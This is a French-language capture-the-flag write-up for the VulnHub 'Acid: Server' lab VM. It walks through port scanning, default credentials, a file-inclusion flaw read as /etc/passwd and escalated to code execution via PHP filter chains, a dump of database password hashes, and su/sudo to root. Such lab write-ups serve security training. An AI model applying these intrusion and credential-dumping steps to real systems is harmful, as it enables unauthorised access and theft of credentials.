# Solution du CTF Acid: Server de VulnHub

[Server](https://vulnhub.com/series/acid,64/) est le premier CTF d'un duo proposé sur VulnHub sous la série *Acid*. Le CTF date du mois d'aout 2015.

```
Nmap scan report for 192.168.56.91
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
|_http-title: /Challenge
|_http-server-header: Apache/2.4.10 (Ubuntu)
```

On trouve un serveur HTTP sur un port non standard. La page d'index ne semble donner aucune information intéressante mais en regardant le code source on voit que le titre fait référence à un path :

```html
	<title>/Challenge</title>
```

Cela devient effectivement plus intéressant quand on se rend sur cette URL puisque l'on tombe sur une mire de login qui demande adresse email et mot de passe.

L'interface semble assez poussée graphiquement et techniquement avec l'utilisation d'une librairie javascript qui chiffre le mot de passe en sha512 pour qu'il ne transite pas en clair sur le réseau.

Les champt du formulaire ne semblent pas vulnérables à une injection SQL et comme je n'ai pas d'adresse email sous la main je m'oriente vers une énumération :

```
200       40l       80w     1333c http://192.168.56.91:33447/Challenge/index.php
200       12l       27w      309c http://192.168.56.91:33447/Challenge/error.php
200       40l       80w     1333c http://192.168.56.91:33447/Challenge/
302        0l        0w        0c http://192.168.56.91:33447/Challenge/include.php
200        3l        3w       17c http://192.168.56.91:33447/Challenge/.gitignore
200     2231l    12761w   811880c http://192.168.56.91:33447/Challenge/bg.jpg
200       36l      503w     2954c http://192.168.56.91:33447/Challenge/todo.txt
```

Le fichier texte est intéressant puisqu'on y retrouve une adresse email :

> TODO List
> =========
> 
> IMPORTANT: IF ANYONE WANTS TO START WORK ON ANY OF THESE THINGS, PLEASE LET ME KNOW (peredur@peredur.net) SO THAT I CAN KEEP TRACK ON WHO'S WORKING ON WHAT.
> 
> I'D HATE TO HAVE TO CHOOSE BETWEEN TWO COMPETING VERSIONS OF THE SAME THING.
> 
> --- snip ---

Une recherche sur Internet pour cette adresse email m'amène sur le projet [GitHub - peredurabefrog/phpSecureLogin: A secure login module for PHP](https://github.com/peredurabefrog/phpSecureLogin).

Ce qui m'intéresse se trouve à la fin du `README` :

> The code to create and populate the necessary tables is included in the 'secure_login.sql' file. It populates the members table with a single user with the following details:
> 
> Username : test_user Email : [test@example.com](mailto:test@example.com) Password : 6ZaxN2Vzm9NUJT2y

Si on saisit ces identifiants on est redirigé vers `protected_page.php` qui nous propose alors d'aller vers `include.php`.

Là un formulaire nous propose de saisir le chemin pour un fichier et si on saisit par exemple `/etc/passwd` on retrouve le contenu du fichier dans la page :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
--- snip ---
whoopsie:x:109:118::/nonexistent:/bin/false
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
saman:x:1001:1001:,,,:/home/saman:/bin/bash
```

Je suis passé directement à un chainage de filtres PHP pour obtenir un RCE de cette faille d'inclusion (voir [GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)).

Une fois un shell récupéré je récupère le mot de passe de la base de données (`mahek`) dans un fichier de configuration et je dump ce qui peut être utile :

```
mysql> select * from members;
+----+-----------+------------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
| id | username  | email                  | password                                                                                                                         | salt                                                                                                                             |
+----+-----------+------------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
|  1 | test_user | test@example.com       | 00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc | f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef |
|  2 | Acid      | acid@gmail.com         | 53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931 | 8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f |
|  3 | saman     | saman.j.l33t@gmail.com | c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234 | be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697 |
|  4 | Vivek     | vik.create@gmail.com   | fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e | c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb |
+----+-----------+------------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
```

Idem pour les autres comptes SQL :

```
mysql> select User,Password from mysql.user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             | *C585694D9A2AB16831EAB1361DEC1908BE17F739 |
| root             | *C585694D9A2AB16831EAB1361DEC1908BE17F739 |
| root             | *C585694D9A2AB16831EAB1361DEC1908BE17F739 |
| acid             | *616B4539A8036DB2A22866D602041053E22D4D51 |
| debian-sys-maint | *97C926204D749AEFD0C330150D4CB3D7B5C57124 |
+------------------+-------------------------------------------+
```

Les hashs stockés dans la table members sont du `sha512` avec un salt comme l'indique la source du code utilisé :

```php
function login($email, $password, $mysqli) {
    // Using prepared statements means that SQL injection is not possible.
    if ($stmt = $mysqli->prepare("SELECT id, username, password, salt
                                  FROM members
                                  WHERE email = ? LIMIT 1")) {
        $stmt->bind_param('s', $email);  // Bind "$email" to parameter.
        $stmt->execute();    // Execute the prepared query.
        $stmt->store_result();

        // get variables from result.
        $stmt->bind_result($user_id, $username, $db_password, $salt);
        $stmt->fetch();

        // hash the password with the unique salt.
        $password = hash('sha512', $password . $salt);
```

J'ai tenté de casser ça avec `hashcat` sur `Penglab` sans succès.

Finalement j'ai trouvé un fichier intéressant en listant les fichiers de l'utilisateur `acid` (il a beaucoup de fichiers dont certains liés à vmware) :

```shellsession
www-data@acid:/var/www/html/Challenge$ find / -user acid 2> /dev/null  | grep -v vmware
/sbin/raw_vs_isi/hint.pcapng
/bin/pwn_me
/bin/pwn_me/chkrootkit.lsm
--- snip ---
```

On peut ouvrir le fichier pcapng avec `Wireshark` mais ici un simple `strings` suffira pour fouiller son contenu. Je trouve la phrase suivante :

> saman and now a days he's known by the alias of 1337hax0r

L'alias en question est accepté comme mot de passe qui nous mène à root :

```shellsession
www-data@acid:/var/www/html/Challenge$ su saman 
Password: 
saman@acid:/var/www/html/Challenge$ sudo -l
[sudo] password for saman: 
Matching Defaults entries for saman on acid:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User saman may run the following commands on acid:
    (ALL : ALL) ALL
saman@acid:/var/www/html/Challenge$ sudo su
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   
root@acid:/var/www/html/Challenge# cd /root
root@acid:~# ls
flag.txt
root@acid:~# cat flag.txt 


Dear Hax0r,


You have successfully completed the challenge.

I  hope you like it.


FLAG NAME: "Acid@Makke@Hax0r"


Kind & Best Regards

-ACID
facebook: https://facebook.com/m.avinash143
```

*Publié le 2 janvier 2023*
